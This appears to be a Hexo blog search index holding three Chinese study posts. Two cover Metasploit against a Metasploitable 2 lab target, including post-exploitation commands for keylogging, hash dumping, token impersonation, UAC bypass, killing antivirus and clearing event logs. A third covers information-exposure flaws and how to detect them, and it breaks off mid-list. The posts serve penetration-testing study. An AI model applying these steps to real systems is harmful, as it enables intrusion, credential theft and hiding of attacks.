<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>metasploit（二）——后渗透测试</title>
    <link href="/2021/03/05/wei2/"/>
    <url>/2021/03/05/wei2/</url>
    
    <content type="html"><![CDATA[<p>今天来学习一下后渗透测试</p><h2 id="meterpreter"><a class="header-anchor" href="#meterpreter">🍭</a>meterpreter</h2><p>Meterpreter是Metasploit框架中的一个扩展模块，在溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后返回一个控制通道（作为攻击载荷获得目标系统的Meterpreter shell的链接）Meterpreter shell有很多功能：添加用户、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息……且Meterpreter能够躲避入侵检测系统，简化任务创建多个会话。可以来利用这些会话进行渗透。<strong>meterpreter在漏洞利用成功后会发送第二阶段的代码和meterpreter服务器dll，在网络不稳定的情况下经常出现没有可执行命令，或者会话建立执行help之后发现缺少命令。 连上vpn又在内网中使用psexec和bind_tcp的时候经常会出现这种情况</strong></p><h4 id="Meterpreter优势"><a class="header-anchor" href="#Meterpreter优势">🍭</a>Meterpreter优势</h4><ul><li>纯内存工作模式，不需要对磁盘进行任何写入操作。</li><li>使用加密通信协议，而且可以同时与几个信道通信。</li><li>在被攻击进程内工作，不需要创建新的进程。</li><li>易于在多进程之间迁移。</li><li>平台通用，适用于Windows、Linux、BSD系统，支持Intel x86和Intelx64</li></ul><h4 id="常用命令"><a class="header-anchor" href="#常用命令">🍭</a>常用命令</h4><pre><code class="hljs properties"><span class="hljs-meta">?</span> <span class="hljs-string">帮助菜单</span><span class="hljs-attr">channel</span> <span class="hljs-string">显示动态频道的信息</span><span class="hljs-attr">close</span> <span class="hljs-string">关闭一个频道</span><span class="hljs-attr">exit</span> <span class="hljs-string">终止meterpreter会话</span><span class="hljs-attr">help</span> <span class="hljs-string">帮助菜单</span><span class="hljs-attr">interact</span> <span class="hljs-string">频道交互</span><span class="hljs-attr">irb</span> <span class="hljs-string">IRB脚本模式</span><span class="hljs-attr">migrate</span>  <span class="hljs-string">pid  转移meterpreter到其他进程</span><span class="hljs-attr">quit</span> <span class="hljs-string">终止meterpreter</span><span class="hljs-attr">read</span> <span class="hljs-string">从频道读数据</span><span class="hljs-attr">run</span> <span class="hljs-string">执行一个meterpreter脚本</span><span class="hljs-attr">use</span> <span class="hljs-string">加载一个或多个扩展</span><span class="hljs-attr">write</span> <span class="hljs-string">向频道写数据</span><span class="hljs-attr">background</span>  <span class="hljs-string">放回后台</span><span class="hljs-attr">getlwd</span>  <span class="hljs-string">查看本地目录</span><span class="hljs-attr">lcd</span>  <span class="hljs-string">切换本地目录</span><span class="hljs-attr">search</span> <span class="hljs-string">-d c:  -f *.doc  搜索文件</span><span class="hljs-attr">run</span> <span class="hljs-string">post/windows/capture/keylog_recorder   键盘记录</span><span class="hljs-attr">use</span> <span class="hljs-string">priv  加载特权模块</span><span class="hljs-attr">getsystem</span>  <span class="hljs-string">提升到SYSTEM权限</span><span class="hljs-attr">steal_token</span> <span class="hljs-string">&lt;PID&gt;  窃取令牌</span><span class="hljs-attr">rev2self</span>  <span class="hljs-string">恢复原来的令牌 </span><span class="hljs-attr">run</span> <span class="hljs-string">killav  关闭杀毒软件 </span><span class="hljs-attr">run</span> <span class="hljs-string">getgui-e  启用远程桌面</span><span class="hljs-attr">portfwd</span> <span class="hljs-string">add -l 1234 -p 3389 -r &lt;目标IP&gt;  端口转发</span><span class="hljs-attr">run</span> <span class="hljs-string">get_local_subnets  获取内网网段信息</span><span class="hljs-attr">run</span> <span class="hljs-string">autoroute -s &lt;内网网段&gt;  创建自动路由</span><span class="hljs-attr">run</span> <span class="hljs-string">autoroute -p  查看自动路由表</span><span class="hljs-attr">sessions</span> <span class="hljs-string">-l 查看会话</span><span class="hljs-attr">网络命令：</span><span class="hljs-attr">portfwd</span> <span class="hljs-string">发送一个本地端口到一个远程服务</span><span class="hljs-attr">route</span> <span class="hljs-string">查看和修改路由表</span><span class="hljs-attr">系统命令：</span><span class="hljs-attr">clearev</span> <span class="hljs-string">清除事件日志</span><span class="hljs-attr">execute</span> <span class="hljs-string">执行一个命令</span><span class="hljs-attr">getpid</span> <span class="hljs-string">取得当前进程ID</span><span class="hljs-attr">getuid</span> <span class="hljs-string">取得服务器运行用户</span><span class="hljs-attr">kill</span> <span class="hljs-string">杀死一个进程</span><span class="hljs-attr">ps</span> <span class="hljs-string">列出进程列表</span><span class="hljs-attr">reboot</span> <span class="hljs-string">重启远程计算机</span><span class="hljs-attr">reg</span> <span class="hljs-string">修改远程注册表</span><span class="hljs-attr">rev2self</span> <span class="hljs-string">在远程机器调用RevertToSelf()</span><span class="hljs-attr">shell</span> <span class="hljs-string">返回一个cmdshell</span><span class="hljs-attr">shutdown</span> <span class="hljs-string">关闭远程系统</span><span class="hljs-attr">sysinfo</span> <span class="hljs-string">取得远程系统的信息</span><span class="hljs-attr">用户接口命令：</span><span class="hljs-attr">enumdesktops</span> <span class="hljs-string">列出所有访问桌面和windows工作站</span><span class="hljs-attr">idletime</span> <span class="hljs-string">远程用户闲置时间</span><span class="hljs-attr">keyscan_dump</span> <span class="hljs-string">转存击键缓存</span><span class="hljs-attr">keyscan_start</span> <span class="hljs-string">开始捕捉击键</span><span class="hljs-attr">keyscan_stop</span> <span class="hljs-string">停止捕捉击键</span><span class="hljs-attr">setdesktop</span> <span class="hljs-string">转移另一个工作站桌面</span><span class="hljs-attr">uictl</span> <span class="hljs-string">用户接口控制</span><span class="hljs-attr">webcam_stream</span> <span class="hljs-string">开启摄像头</span><span class="hljs-attr">screenshot</span>  <span class="hljs-string">截屏</span><span class="hljs-attr">密码数据库命令：</span><span class="hljs-attr">hashdump</span> <span class="hljs-string">SAM转储</span><span class="hljs-attr">时间戳命令：</span><span class="hljs-attr">timestomp</span> <span class="hljs-string">修改文件时间戳</span></code></pre><h3 id="测试"><a class="header-anchor" href="#测试">🍭</a>测试</h3><p>后渗透测试是建立在成功对目标机器攻击渗透后，故进入meterpreter模块前需在攻击机和目标机之间建立一个shell（不再赘述，按(一)里那样操作）</p><p><img src="/2021/03/05/wei2/1.jpg" alt="1"></p><p>这次利用的是PHP GCI参数执行漏洞。</p><h4 id="进程迁移"><a class="header-anchor" href="#进程迁移">🍭</a>进程迁移</h4><p>在刚获得Meterpreter Shell时，该Shell极其脆弱和易受攻击的，攻击者可以利用浏览器漏洞攻陷目标机器，但攻击渗透后浏览器有可能被用户关闭。所以第一步就是要移动这个Shell，把它和目标机中一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作。</p><h5 id="法一"><a class="header-anchor" href="#法一">🍭</a>法一</h5><p>先<code>ps</code>获取目标机正在运行的进程:</p><img src="/2021/03/05/wei2/ps.jpg" alt="ps" style="zoom: 67%;"><p>再用<code>migrate [pid]</code>命令将shell移动到对应的pid的进程里，进程迁移完原本的shell进程会自动关闭，若无自动关闭可用<code>kill [pid]</code>命令关掉该进程</p><h5 id="法二"><a class="header-anchor" href="#法二">🍭</a>法二</h5><p>使用<code>run post/linux/manage/migrate</code>命令，系统会自动寻找合适的进程迁移。</p><h4 id="收集系统信息"><a class="header-anchor" href="#收集系统信息">🍭</a>收集系统信息</h4><blockquote><p><code>sysinfo</code>查询信息</p><p><code>run post/linux/gather/checkvm</code>查询目标机是否在虚拟机上运行</p><p><code>idletime</code>查看虚拟机最近运行时间</p><p><code>route</code>查看目标机完整的网络设置</p><p><code>getuid</code>查看已经渗透的用户名</p><p><code>run post/linux/manage/killav</code>关闭杀毒软件</p></blockquote><h4 id="借助被攻击的主机对其它网络进行攻击"><a class="header-anchor" href="#借助被攻击的主机对其它网络进行攻击">🍭</a>借助被攻击的主机对其它网络进行攻击</h4><blockquote><p>先<code>run post/linux/manage/enable_rdp</code>启动远程桌面协议（3389端口）</p><p>再用<code>run post/linux/manage/autoroute</code>查看目标机本地子网</p><p>然后用<code>route add xxx</code>命令添加路由，xxx的值由本地子网中信息决定(在此之前先<code>background</code>将终端隐藏在后台)添加成功后可用<code>route print</code>查看</p></blockquote><h4 id="抓取各种信息"><a class="header-anchor" href="#抓取各种信息">🍭</a>抓取各种信息</h4><blockquote><p>接着用<code>run post/linux/gather/enum_logged_on_users</code>列举登录在目标机上的用户</p><p>再用<code>run post/linux/gather/enum_application</code>列举安装在目标机上的应用</p><p>当用户将某应用设为自动登录时用<code>run windows/gather/credentials/windows_autologin</code>可抓取用户名和密码</p><p>截屏:用<code>screenshot</code>或<code>load espia(加载插件)+screengrab</code></p><p>检查是否有摄像头<code>webcam list</code></p><p>打开摄像头拍照：<code>webcam_snap</code></p><p>开启直播模式<code>webcan_stream</code></p></blockquote><h2 id="提权"><a class="header-anchor" href="#提权">🍭</a>提权</h2><p>通常只获得系统的Guest或User权限无法进行获取Hash、安装软件、修改防火墙规则和修改注册表等各种操作，所以必须将访问权限从Guset提升到User,再到Administrator，最后到System级别。<br>渗透的最终目的是获取服务器的最高权限。</p><p>提升权限的方式：<br>纵向提权：低权限角色获得高权限角色的权限。<br>横向提权：获取同级别角色的权限。</p><h4 id="利用漏洞提权"><a class="header-anchor" href="#利用漏洞提权">🍭</a>利用漏洞提权</h4><blockquote><p>先查看当前权限:<code>whoami/groups</code></p><p>直接<code>getsystem</code>提权,但一般会失败</p><p>查看补丁:<code>sysinfo</code>即可(也可以用wmic查看)</p><p>接下来找提权的EXP，将系统已经安装的补丁编号与提权的EXP编号进行对比，使用没有编号的EXP进行提权,如果用最新的MS16-032(本地溢出漏洞)来尝试提权，对应编号是KB3139914(可在安全焦点或者<code>Exploit-DB</code>查询漏洞的具体信息)</p><p>然后将meterpreter转到后台,搜索MS16-032漏洞,指定session进行提权即可</p></blockquote><h4 id="绕过uac-用户账户控制-提权"><a class="header-anchor" href="#绕过uac-用户账户控制-提权">🍭</a>绕过uac(用户账户控制)提权</h4><p>因为win7以上版本电脑含有UAC,故getsystem提权时一般会失败</p><h5 id="使用ask模块进行弹窗，用户在弹窗点击“是”即可绕过UAC"><a class="header-anchor" href="#使用ask模块进行弹窗，用户在弹窗点击“是”即可绕过UAC">🍭</a>使用ask模块进行弹窗，用户在弹窗点击“是”即可绕过UAC</h5><ul><li><code>use exploit/windows/local/ask</code></li><li>set session 1</li></ul><h5 id="使用bypassuac模块，利用受信任的通过进程注入的发布者证书，产生一个关闭UAC标志的shell"><a class="header-anchor" href="#使用bypassuac模块，利用受信任的通过进程注入的发布者证书，产生一个关闭UAC标志的shell">🍭</a>使用bypassuac模块，利用受信任的通过进程注入的发布者证书，产生一个关闭UAC标志的shell</h5><ul><li><code>use exploit/windows/local/bypassuac</code>or<code>use exploit/windows/local/bypassuac</code></li><li>set session 1</li></ul><h2 id="令牌窃取"><a class="header-anchor" href="#令牌窃取">🍭</a>令牌窃取</h2><p>token之前介绍过了,这里做个补充</p><p>令牌种类:</p><ul><li><p>访问令牌(Access Token)表示访问控制操作主题的系统对象</p></li><li><p>密保令牌(Security token),又叫作认证令牌或者硬件令牌，是一种计算机身份校验的物理设备</p></li><li><p>会话令牌(Session Token)是交互会话中唯一的身份标识符</p></li></ul><h4 id="Kerberos协议"><a class="header-anchor" href="#Kerberos协议">🍭</a>Kerberos协议</h4><p><img src="/2021/03/05/wei2/1.png" alt="1"></p><h4 id="步骤"><a class="header-anchor" href="#步骤">🍭</a>步骤</h4><blockquote><p>先<code>use incognito</code>加载功能</p><p>再<code>list_tokens -u </code> 列出目标主机用户的可用令牌</p><blockquote><p>一般有两种类型的令牌：</p><p><code>Delegation Tokens</code>(授权令牌)支持交互式登录</p><p><code>Impersonation Tokens</code>(模拟令牌),非交互的会话</p><p>令牌的数量取决于Meterpreter Shell的访问级别</p></blockquote></blockquote><blockquote><p>从得到的信息中可以看到有效令牌其格式为<code>主机名\登录的用户名</code></p><p>调用<code>impersonate_token HOSTNAME\\USERNAME </code> 假冒目标主机上的可用令牌</p><p>假冒成功🌞🌞🌞</p></blockquote><h4 id="清除事件日志"><a class="header-anchor" href="#清除事件日志">🍭</a>清除事件日志</h4><p>完成攻击操作之后使用命令“clearev”命令清除事件日志</p><h2 id="HASH攻击"><a class="header-anchor" href="#HASH攻击">🍭</a>HASH攻击</h2><h4 id="hashdump"><a class="header-anchor" href="#hashdump">🍭</a>hashdump</h4><p>Hashdump Meterpreter脚本可以从目标机器中提取Hash值，破解Hash值即可获得登录密码。计算机中的每个账号的用户名和密码都存储在sam文件中，当计算机运行时，该文件对所有账号进行锁定，要想访问就必须有“系统级”账号。所以要使用该命令就必须进行权限的提升。</p><ul><li><code>hashdump</code>(只能在system级权限下)</li><li><code>smart_hashdump</code>模块,<strong>在window中因为有UAC故要先绕过它</strong></li></ul><h4 id="Quarks-PwDump"><a class="header-anchor" href="#Quarks-PwDump">🍭</a>Quarks PwDump</h4><p>在Windows系统中，密码以加密的方式保存在/windows/system32cm下的sam文件里，账号在登录后会将密码的密文和明文保存在系统的内存中。情况下系统启动后，sam文件是不能被读取的，但PwDump可以.</p><p>参数:</p><blockquote><p>-dhl：导出本地哈希值。<br>-dhdc：导出内存中的域控哈希值。<br>-dhd：导出域控哈希值，必须指定NTDS文件。<br>-db：导出Bitlocker信息，必须指定NTDS文件。<br>-nt：导出NTDS文件。<br>-hist:导出历史信息，可选项。<br>-t：可选导出类型，默认导出John类型。<br>-0：导出文件到本地。</p></blockquote><h4 id="Windows-Credentials-Editor"><a class="header-anchor" href="#Windows-Credentials-Editor">🍭</a>Windows Credentials Editor</h4><p>WCE能列举登录会话，添加、改变和删除相关凭据(例如LM/NT Hash)。这些功能在内网渗透中能够被利用,但必须在管理员权限下使用，还要注意杀毒工具的免杀。</p><blockquote><p>先用<code>upload/root/wce.exe c:\</code>命令将wce.exe上传到目标主机C盘中</p><p>然后在目标机Shell下用<code>wce-w</code>提取系统明文管理员的密码</p></blockquote><p>参数:</p><blockquote><p>-l   读取数据格式<code>username:domain:lm：ntlm</code>(从内存中读取已经登录的信息,默认的读取方式是先用安的方式读取，若读取失败再用不安全的方式，</p><p>-f   强制使用安全的方式读取</p><p>-g  计算密码，制定一个系统明文会使用的加密方法来计算密文</p><p>-c  指定会话执行cmd</p><p>-v  显示详细信息</p><p>-w  查看已登录的明文密码</p><p>-s  更改当前登录会话的NTLM凭据。参数:&lt;用户名&gt;:&lt;域名&gt;:&lt; LMHash &gt;: &lt; NTHash &gt;</p><p>-r  无限期地列出登录会话和NTLM凭证。如果发现新的会话，每5秒刷新一次;可选:- r &lt;刷新间隔&gt;</p><p>-e  无限期地列出登录会话NTLM凭证。每次发生登录事件时刷新</p><p>-o  将所有输出保存到文件中。参数:&lt;文件名&gt;</p><p>-i  指定LUID而不是使用当前登录会话。参数:&lt; luid &gt;</p><p>-d  从登录会话中删除NTLM凭证。参数:&lt; luid &gt;</p></blockquote><p>科普完成☀️☀️☀️</p><p>参考:</p><p>《web安全攻防渗透测试实战指南》</p><p><a href="https://blog.csdn.net/smli_ng/article/details/106311397">https://blog.csdn.net/smli_ng/article/details/106311397</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Metasploit(一)——入门测试</title>
    <link href="/2021/02/27/wei1/"/>
    <url>/2021/02/27/wei1/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a class="header-anchor" href="#简介">🍭</a>简介</h2><p>Metasploit框架(Metasploit Framework，MSF)是一个开源工具，由Ruby程序语言编写的模板化框架，具有很好的扩展性，便于渗透测试人员开发、使用定制的工具模板。</p><p>Metasploit可向后端模块提供多种用来控制测试的接口（如控制台、Web、CLI)推荐使用控制台接口，通过控制台接口，你可以访问和使用所有Metasploit的插件，例如Payload、利用模块、Post模块等。Metasploit还有第三方程序的接口，例如Nmap,SQLMap……</p><p>MSF框架由多个模块构成：</p><table><thead><tr><th>模块</th><th>功能</th></tr></thead><tbody><tr><td>Auxiliaries(辅助模块)</td><td>该模块不会直接在测试者和目标主机之间建立访问，只负责执行扫描、嗅探、指纹识别等相关功能以辅助渗透测试。</td></tr><tr><td>Exploit(漏洞利用模块)</td><td>漏洞利用是指由渗透测试者利用一个系统、应用或者服务中的安全漏洞进行的攻击行为。流行的渗透攻击技术包括缓冲区溢出、Web应用程序攻击，以及利用配置错误等，其中包含攻击者或测试人员针对系统中的漏洞而设计的各种POC验证程序，用于破坏系统安全性的攻击代码，每个漏洞都有相应的攻击代码。</td></tr><tr><td>Payload(攻击载荷模块)</td><td>攻击载荷是我们期望目标系统在被渗透攻击之后完成实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令或者执行特定代码，在Metasploit框架中可以自由地选择、传送和植入。攻击载荷也可能是简单地在目标操作系统上执行一些命令，如添加用户账号等。</td></tr><tr><td>Post(后期渗透模块)</td><td>模块主要用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、实施跳板攻击等。</td></tr><tr><td>Encoders(编码工具模块)</td><td>该模块在渗透测试中负责免杀，以防止被杀毒软件、防火墙、IDS及类似的安全软件检测出来</td></tr></tbody></table><h3 id="常用命令"><a class="header-anchor" href="#常用命令">🍭</a>常用命令</h3><p>直接help可查询</p><p><img src="/2021/02/27/wei1/2.jpg" alt="2"></p><p>好好学英语😔😔😔</p><h4 id="msfconsole"><a class="header-anchor" href="#msfconsole">🍭</a>msfconsole</h4><pre><code class="hljs properties"><span class="hljs-meta">?</span>             <span class="hljs-string">显示帮助菜单</span><span class="hljs-attr">back</span>          <span class="hljs-string">从当前环境返回到主路径</span><span class="hljs-attr">banner</span>        <span class="hljs-string">显示软件旗标信息</span><span class="hljs-attr">cd</span>            <span class="hljs-string">改变当前工作路径</span><span class="hljs-attr">color</span>         <span class="hljs-string">切换颜色</span><span class="hljs-attr">connect</span>       <span class="hljs-string">连接主机，类似于telnet和nc</span><span class="hljs-attr">exit</span>          <span class="hljs-string">退出</span><span class="hljs-attr">help</span>          <span class="hljs-string">显示帮助菜单，即该页面</span><span class="hljs-attr">info</span>          <span class="hljs-string">显示模块的详细信息</span><span class="hljs-attr">irb</span>           <span class="hljs-string">进入irb脚本模式</span><span class="hljs-attr">jobs</span>          <span class="hljs-string">显示和管理作业</span><span class="hljs-attr">kill</span>          <span class="hljs-string">结束一个作业</span><span class="hljs-attr">load</span>          <span class="hljs-string">加载framework插件</span><span class="hljs-attr">loadpath</span>      <span class="hljs-string">从指定路径加载模块</span><span class="hljs-attr">quit</span>          <span class="hljs-string">退出</span><span class="hljs-attr">resource</span>      <span class="hljs-string">运行文件中的命令</span><span class="hljs-attr">route</span>         <span class="hljs-string">Route traffic through a session</span><span class="hljs-attr">save</span>          <span class="hljs-string">保持数据</span><span class="hljs-attr">search</span>        <span class="hljs-string">搜索模块及名称</span><span class="hljs-attr">sessions</span>      <span class="hljs-string">显示及转存会话列表</span><span class="hljs-attr">set</span>           <span class="hljs-string">设置变量值</span><span class="hljs-attr">setg</span>          <span class="hljs-string">设置全局变量值</span><span class="hljs-attr">show</span>          <span class="hljs-string">显示给定类型的模块或全部模块</span><span class="hljs-attr">sleep</span>         <span class="hljs-string">休眠</span><span class="hljs-attr">unload</span>        <span class="hljs-string">卸载 framework 插件</span><span class="hljs-attr">unset</span>         <span class="hljs-string">取消变量设置</span><span class="hljs-attr">unsetg</span>        <span class="hljs-string">取消全局变量设置</span><span class="hljs-attr">use</span>           <span class="hljs-string">根据名字选择一个模块</span><span class="hljs-attr">version</span>       <span class="hljs-string">显示版本</span><span class="hljs-attr">advanced</span>      <span class="hljs-string">显示一个或多个模块的高级选项</span><span class="hljs-attr">clearm</span>        <span class="hljs-string">清除模块栈</span><span class="hljs-attr">listm</span>         <span class="hljs-string">列出模块堆栈</span><span class="hljs-attr">options</span>       <span class="hljs-string">显示一个或多个模块的全局选项</span><span class="hljs-attr">popm</span>          <span class="hljs-string">从堆栈中弹出最新的模块并使其处于活动状态</span><span class="hljs-attr">previous</span>      <span class="hljs-string">将先前加载的模块设置为当前模块</span><span class="hljs-attr">pushm</span>         <span class="hljs-string">将活动模块或模块列表推入模块堆栈</span><span class="hljs-attr">reload_all</span>    <span class="hljs-string">从所有定义的模块路径中重新加载所有的模块</span><span class="hljs-attr">search</span>        <span class="hljs-string">搜索模块名称和描述</span><span class="hljs-attr">show</span>          <span class="hljs-string">显示给定类型的模块或所有模块</span><span class="hljs-attr">log</span>           <span class="hljs-string">如果可能的话，将显示框架.log页面显示到末尾</span><span class="hljs-attr">pry</span>           <span class="hljs-string">打开当前模块或框架上的撬调试器</span><span class="hljs-attr">reload_lib</span>    <span class="hljs-string">从指定的路径重新加载Ruby库文件</span><span class="hljs-attr">db_add_host</span>   <span class="hljs-string">添加一个或多个主机到数据库</span><span class="hljs-attr">db_add_note</span>   <span class="hljs-string">添加一个注释到主机</span><span class="hljs-attr">db_add_port</span>   <span class="hljs-string">添加一个端口到主机</span><span class="hljs-attr">db_connect</span>    <span class="hljs-string">连接一个存在的数据库</span><span class="hljs-attr">db_create</span>     <span class="hljs-string">创建一个新的数据库实例</span><span class="hljs-attr">db_del_host</span>   <span class="hljs-string">从数据库删除一个或多个主机</span><span class="hljs-attr">db_del_port</span>   <span class="hljs-string">从数据库删除一个端口</span><span class="hljs-attr">db_destroy</span>    <span class="hljs-string">删除一个存在的数据库</span><span class="hljs-attr">db_disconnect</span> <span class="hljs-string">断开与当前数据库实例的连接</span><span class="hljs-attr">db_driver</span>     <span class="hljs-string">指定一个数据库驱动</span><span class="hljs-attr">db_hosts</span>      <span class="hljs-string">列出数据库中的所有主机</span><span class="hljs-attr">db_nmap</span>       <span class="hljs-string">执行Nmap并记录输出</span><span class="hljs-attr">db_notes</span>      <span class="hljs-string">列出数据库中的所有注释</span><span class="hljs-attr">db_services</span>   <span class="hljs-string">列出数据库中的所有服务</span><span class="hljs-attr">db_vulns</span>      <span class="hljs-string">列出数据库中的所有漏洞</span><span class="hljs-attr">db_workspace</span>  <span class="hljs-string">转换数据库工作区</span><span class="hljs-attr">db_import_ip_list</span>     <span class="hljs-string">引入一个IP列表文件</span><span class="hljs-attr">db_import_amap_mlog</span>   <span class="hljs-string">引入一个THC-Amap扫描结果文件(-o -m)</span><span class="hljs-attr">db_import_nessus_nbe</span>  <span class="hljs-string">引入一个Nessus扫描结果文件(NBE)</span><span class="hljs-attr">db_import_nessus_xml</span>  <span class="hljs-string">引入一个Nessus扫描结果文件</span><span class="hljs-attr">db_import_nmap_xml</span>    <span class="hljs-string">引入一个Nmap扫描结果文件(-oX)</span><span class="hljs-attr">db_autopwn</span>            <span class="hljs-string">自动利用</span></code></pre><h3 id="初级测试"><a class="header-anchor" href="#初级测试">🍭</a>初级测试</h3><p>接下来用Metasploitable 2靶机进行测试</p><h4 id="先用nmap查看系统开放端口和相关应用程序"><a class="header-anchor" href="#先用nmap查看系统开放端口和相关应用程序">🍭</a>先用nmap查看系统开放端口和相关应用程序</h4><p>通常使用<code>nmap –sV IP(或者域名)</code>，如果机器设置有防火墙禁ping，可以使用nmap -P0(或者-Pn) –sV IP(或者域名)来查看主机的开放情况</p><p><img src="/2021/02/27/wei1/3.jpg" alt="3"></p><p>可以看到靶机开放的端口，开放状态，服务类型，和版本号，其中渗透最重要的两个参数是开放状态和版本号。版本号也就是系统扫描中，在开发安全扫描件里经常提及的漏洞指纹，因为大部分漏洞的产生就是某一版本的问题。我们此次要攻击139端口，如图中，可以看到服务的指纹信息，主要就是服务名称和版本号，是samba的服务，处于3.X-4.X版本。</p><h4 id="搜索Samba的exploit"><a class="header-anchor" href="#搜索Samba的exploit">🍭</a>搜索Samba的exploit</h4><p><img src="/2021/02/27/wei1/1.jpg" alt="1"></p><p>利用返回的结果中各个漏洞被利用的难易程度选择漏洞，这里我选<code>exploit/multi/samba/usermap_script</code>因为它难度较低。一般有限选择excellent和great两种等级，因为稳定且效果明显，其次就是后面的描述是否和我们攻击的服务有关</p><h4 id="查询漏洞详细信息"><a class="header-anchor" href="#查询漏洞详细信息">🍭</a>查询漏洞详细信息</h4><p><img src="/2021/02/27/wei1/4.jpg" alt="4"></p><p>使用该exploit，查看exploit下的payloads(如果是知道使用哪个模块，可以输入每个 / 后的前2-4个字母使用table补齐)</p><p><img src="/2021/02/27/wei1/5.jpg" alt="5"></p><p>选择攻击载荷的时候，建议选用和meterpreter和reverse相关的载荷(由于攻击的目标机可能处在内网里，攻击的时候存在端口映射等方面的问题，使用反弹可以更稳定)这次就用<code>cmd/unix/reverse</code></p><h4 id="接下来查看需要填写的参数"><a class="header-anchor" href="#接下来查看需要填写的参数">🍭</a>接下来查看需要填写的参数</h4><p><img src="/2021/02/27/wei1/7.jpg" alt="7"></p><blockquote><p><strong>Tips:</strong></p><p>在真实的环境中，RPORT可能并不是默认的参数，由于一个服务是放在内网当中，他通过路由器转发，可能会出现端口的变化（端口映射）<br>exploit target也是非常重要的参数，可通过show targets，查看目标系统有哪些.<br>查看目标的系统，可以使用：nmap –O IP，然后使用set target ID选择目标类型，主要用于增加成功</p></blockquote><p>其中只有RHOST是空，我们需要自己填上该信息</p><p><img src="/2021/02/27/wei1/6.jpg" alt="6"></p><p>现在就可以发动攻击，执行任意命令</p><p><img src="/2021/02/27/wei1/8.jpg" alt="8"></p><p>入门的测试就完成辽❤️❤️❤️</p><h3 id="后记"><a class="header-anchor" href="#后记">🍭</a>后记</h3><p>由于本篇记录入门测试，故选择的靶机也较为基础，实战中目标主机的很多信息都需要收集，无法像本篇文章用到的靶机一样可以直接获取信息，后渗透测试改天再学习👻👻👻</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Information Exposure</title>
    <link href="/2021/02/24/everything/"/>
    <url>/2021/02/24/everything/</url>
    
    <content type="html"><![CDATA[<h2 id="概述"><a class="header-anchor" href="#概述">🍭</a>概述</h2><p>由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到：</p><ul><li><p>通过访问url下的目录，可以直接列出目录下的文件列表</p></li><li><p>输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息</p></li><li><p>前端的源码（<code>html,css,js</code>）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等</p></li></ul><p>敏感信息泄露往往给攻击着实施进一步的攻击提供很大的帮助，漏洞出现的位置、造成的危害有很大的差异性。</p><h2 id="类型"><a class="header-anchor" href="#类型">🍭</a>类型</h2><h4 id="网络信息泄露"><a class="header-anchor" href="#网络信息泄露">🍭</a>网络信息泄露</h4><ul><li><p>DNS域传送漏洞</p></li><li><p>运维监控系统弱口令、网络拓扑泄露</p><p>zabbix弱口令、zabbix sql注入……</p></li></ul><h4 id="WEB敏感信息"><a class="header-anchor" href="#WEB敏感信息">🍭</a>WEB敏感信息</h4><ul><li><p>phpinfo()信息泄露</p></li><li><p>测试页面泄露在外网</p></li></ul><p><code> test.cgi、phpinfo.php、info.php</code>等</p><ul><li>编辑器备份文件泄露在外网</li></ul><p><code>http://[ip]/.test.php.swp</code></p><p><code> http://[ip]/test.php.bak</code></p><p><code> http://[ip]/test.jsp.old</code></p><p><code> http://[ip]/cgi~</code></p><p>常见编辑器备份后缀</p><ul><li>版本管理工具(如git)文件信息泄露</li></ul><p><code>http://[ip]/.git/config</code></p><p><code> http://[ip]/CVS/Entriesp</code></p><p><code>http://[ip]/.svn/entriesp</code></p><p><code>http://[ip]/.svn/wc.db</code></p><ul><li>HTTP认证泄露漏洞</li></ul><p><code>http://[ip]/basic/index.php</code></p><p>Web目录开启了HTTP Basic认证，但未限制IP，导致可暴力破解账号、密码</p><ul><li>管理后台地址泄露</li></ul><p><code> http://[ip]/login.php</code></p><p><code> http://[ip]/admin.php</code></p><ul><li><p>错误页面暴露信息</p><p>错误页面由服务器产生403、404、500等错误时，返回详细错误信息。报错信息中可能会包含服务器代码信息、数据库连接信息、SQL语句或者敏感文件的路径</p><p><strong>检测</strong>：</p><p>1.通过目录扫描或手工输入不存在的文件或路径，触发服务器产生404错误并返回404页面</p><p>2.通过目录扫描或手工输入一个无权限查看的文件或路径，触发服务器产生403错误并返回403页面</p><p>3.手工输入不存在的参数或特殊构造的字符串，如单引号，尖括号等，触发服务器产生500错误并返回500页面或异常信息。</p></li><li><p>服务器探针文件</p></li><li><p>存在可访问的管理控制台入口</p><p>Web 控制台是一种基于 Web 的用户界面，  其常常被用于网站后台或者web容器。控制台中，其不仅仅局限于容器或者网站管理后台，还包括一些数据库默认地址等。在web安全中，网站系统在泄漏其web容器（中间件）或者数据库的控制台后，存在增加被入侵的风险。常见的web控制台：<code>tomcat、aria2、weblogic、websphere、oracle、jboss……</code>web的容器控制台常见访问形式：<code>http://host:port/load/</code></p><p><strong>检测</strong>：</p><p>思路为首先需识别网站容器的指纹，判断其所采用的中间件，然后去扫描其所开放的端口，根据开放端口信息和常见固定的路径，去判断其控制台地址。</p></li><li><p>存在可访问的管理后台入口(应该比较少见)</p><p>应用存在未限制访问的后台，或者能直接登录管理后台,或利用上传功能上传webshell，导致服务器被控制</p><p><strong>检测</strong>：</p><ol><li><p>可以利用web漏洞扫描器或目录扫描器扫描web应用进行检测</p></li><li><p>识别网站使用的cms框架，判断其默认的管理后台地址。</p></li><li><p>在网站中寻找管理后台超链接</p></li></ol></li><li><p>默认页面泄漏</p><p>存在默认安装中间件、插件、框架等会携带示例页面及说明文档</p></li><li><p>入侵痕迹残留</p><p>在渗透过程中发现应用中存在曾经的入侵痕迹，如存在的webshell文件。残留的入侵痕迹可被其他攻击者用于二次攻击.</p><p><strong>检测</strong>：</p><p>通常使用Web应用安全漏洞扫描工具或目录扫描工具发现入侵痕迹</p></li><li><p>HTTP头信息泄漏</p><p>在服务器返回的HTTP头中泄露服务器信息</p><p><strong>检测</strong>:</p><ol><l